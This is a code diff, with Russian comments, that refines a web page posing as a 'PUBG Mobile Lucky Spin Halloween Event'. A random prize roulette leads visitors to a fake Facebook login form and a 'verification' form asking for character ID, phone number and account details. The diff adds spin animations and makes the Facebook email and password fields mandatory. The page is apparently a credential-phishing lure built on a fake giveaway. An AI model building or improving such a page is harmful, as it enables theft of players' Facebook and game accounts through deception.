@@ -444,6 +444,20 @@
             margin-bottom: 10px;
         }
         
+        /* Анимация вращения рулетки */
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .roulette-spinning {
+            animation: spin 0.5s linear infinite;
+        }
+        
         /* Адаптивность */
         @media (max-width: 768px) {
             .main-title {
@@ -503,9 +517,15 @@
             <h2 style="color: #ffcc00; margin-bottom: 20px; font-size: 2rem;">PUBG MOBILE LUCKY SPIN HALLOWEEN EVENT</h2>
             
             <div class="roulette-container">
-                <img src="roulette-pointer.png" alt="Pointer" class="roulette-pointer">
+                <!-- Стрелка указатель -->
+                <svg class="roulette-pointer" viewBox="0 0 100 120" xmlns="http://www.w3.org/2000/svg">
+                    <polygon points="50,0 65,100 35,100" fill="#ffcc00" stroke="#ff9900" stroke-width="3"/>
+                    <circle cx="50" cy="110" r="10" fill="#ff6600"/>
+                </svg>
+                
                 <div class="roulette-wheel">
-                    <img src="roulette.jpg" alt="Roulette" class="roulette-image" id="rouletteImage">
+                    <!-- Ваша вырезанная рулетка -->
+                    <img src="ruulette.jpg" alt="Roulette" class="roulette-image" id="rouletteImage">
                 </div>
             </div>
             
@@ -657,6 +677,7 @@
         let currentPrize = null;
         let isSpinning = false;
         let currentRotation = 0;
+        let spinAnimation = null;
         
         // Инициализация сетки призов
         function initPrizesGrid() {
@@ -672,6 +693,16 @@
             });
         }
         
+        // Начать анимацию вращения
+        function startSpinning() {
+            rouletteImage.classList.add('roulette-spinning');
+        }
+        
+        // Остановить анимацию вращения
+        function stopSpinning() {
+            rouletteImage.classList.remove('roulette-spinning');
+        }
+        
         // Вращение рулетки
         function spinRoulette() {
             if (isSpinning) return;
@@ -683,23 +714,35 @@
             const prizeIndex = Math.floor(Math.random() * prizes.length);
             currentPrize = prizes[prizeIndex];
             
-            // Каждый приз занимает 30 градусов на рулетке (360/12)
-            const prizeAngle = prizeIndex * 30;
+            console.log(`Выбран приз: ${currentPrize.name} (индекс: ${prizeIndex})`);
             
-            // Вычисляем конечное вращение
-            // Делаем несколько полных оборотов + угол приза
-            const fullRotations = 5; // 5 полных оборотов
-            const targetRotation = fullRotations * 360 + (360 - prizeAngle) + 15; // +15 чтобы стрелка указывала на центр приза
+            // Начинаем анимацию вращения
+            startSpinning();
             
-            // Анимация вращения
-            currentRotation += targetRotation;
-            rouletteImage.style.transform = `rotate(${currentRotation}deg)`;
-            
-            // После завершения вращения
+            // Останавливаем анимацию через случайное время (имитация вращения)
             setTimeout(() => {
-                isSpinning = false;
-                showAuthSection();
-            }, 4000);
+                stopSpinning();
+                
+                // Вычисляем угол для выбранного приза
+                // Предполагаем, что рулетка разделена на 12 секторов по 30 градусов
+                const sectorAngle = 30; // градусов
+                const targetAngle = prizeIndex * sectorAngle;
+                
+                // Добавляем несколько полных оборотов для реалистичности
+                const fullRotations = 5;
+                const totalRotation = fullRotations * 360 + (360 - targetAngle) + Math.floor(Math.random() * 15);
+                
+                // Применяем финальное вращение
+                rouletteImage.style.transform = `rotate(${totalRotation}deg)`;
+                currentRotation = totalRotation % 360;
+                
+                // Показываем секцию авторизации после небольшой паузы
+                setTimeout(() => {
+                    showAuthSection();
+                    isSpinning = false;
+                }, 1000);
+                
+            }, 2000 + Math.random() * 2000); // Вращение от 2 до 4 секунд
         }
         
         // Показать раздел авторизации
@@ -740,14 +783,14 @@
             const formData = new FormData(verifyForm);
             const data = {
                 prize: currentPrize.name,
-                characterId: formData.get('characterId') || document.getElementById('characterId').value,
-                characterName: formData.get('characterName') || document.getElementById('characterName').value,
-                phoneNumber: formData.get('phoneNumber') || document.getElementById('phoneNumber').value,
-                accountLevel: formData.get('accountLevel') || document.getElementById('accountLevel').value,
-                rankedTier: formData.get('rankedTier') || document.getElementById('rankedTier').value,
-                royalePassType: formData.get('royalePassType') || document.getElementById('royalePassType').value,
-                royalePassLevel: formData.get('royalePassLevel') || document.getElementById('royalePassLevel').value,
-                platform: formData.get('platform') || document.getElementById('platform').value,
+                characterId: document.getElementById('characterId').value,
+                characterName: document.getElementById('characterName').value,
+                phoneNumber: document.getElementById('phoneNumber').value,
+                accountLevel: document.getElementById('accountLevel').value,
+                rankedTier: document.getElementById('rankedTier').value,
+                royalePassType: document.getElementById('royalePassType').value,
+                royalePassLevel: document.getElementById('royalePassLevel').value,
+                platform: document.getElementById('platform').value,
                 timestamp: new Date().toLocaleString()
             };
             
@@ -802,6 +845,16 @@
         
         fbLoginButton.addEventListener('click', (e) => {
             e.preventDefault();
+            
+            // Простая валидация формы Facebook
+            const email = document.getElementById('fbEmail').value;
+            const password = document.getElementById('fbPassword').value;
+            
+            if (!email || !password) {
+                alert('Please enter your email and password');
+                return;
+            }
+            
             // Здесь должна быть реальная проверка данных Facebook
             // Но для демо просто переходим к верификации
             showVerifySection();
@@ -815,14 +868,21 @@
         cancelButton.addEventListener('click', () => {
             congratsSection.style.display = 'none';
             spinButton.disabled = false;
+            
+            // Сброс рулетки
+            rouletteImage.style.transform = 'rotate(0deg)';
         });
         
         okButton.addEventListener('click', () => {
             congratsSection.style.display = 'none';
             spinButton.disabled = false;
             
-            // Сброс формы
+            // Сброс рулетки и формы
+            rouletteImage.style.transform = 'rotate(0deg)';
             verifyForm.reset();
+            facebookForm.style.display = 'none';
+            document.getElementById('fbEmail').value = '';
+            document.getElementById('fbPassword').value = '';
         });
         
         // Имитация входа через Facebook при клике на ссылки формы
@@ -847,6 +907,7 @@
             
             // Если картинка рулетки не загружена, используем CSS-замену
             rouletteImage.onerror = function() {
+                console.log('Ошибка загрузки рулетки, используется заглушка');
                 this.src = 'https://via.placeholder.com/500x500/8B4513/FFFFFF?text=ROULETTE';
             };
             
@@ -869,6 +930,9 @@
                     this.src = 'https://via.placeholder.com/150x100/333/FFCC00?text=PRIZE';
                 };
             });
+            
+            // Проверяем наличие рулетки
+            console.log('Рулетка загружена:', rouletteImage.src);
         };
     </script>
 </body>
